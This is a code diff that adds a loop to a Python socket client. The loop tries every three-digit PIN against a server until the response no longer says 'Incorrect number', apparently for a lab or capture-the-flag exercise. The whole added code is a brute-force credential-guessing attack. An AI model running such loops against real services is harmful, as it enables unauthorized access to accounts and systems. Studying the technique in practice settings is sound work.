@@ -31,3 +31,20 @@ def send_request(pin):
     client_socket.close()
 
     return response
+
+# I try this loop to try all possible PINs from 000 to 999
+for pin in range(1000):
+    # Format the pin to ensure it's 3 digits
+    pin_str = f"{pin:03d}"
+    print(f"Trying PIN: {pin_str}")
+
+    response = send_request(pin_str)
+    
+    # If the correct PIN is found, print it and break the loop
+    if "Incorrect number" not in response:
+        print(f"Correct PIN found: {pin_str}")
+        break
+
+    # Wait for the server's delay (if any) before trying again
+    time.sleep(1)
+
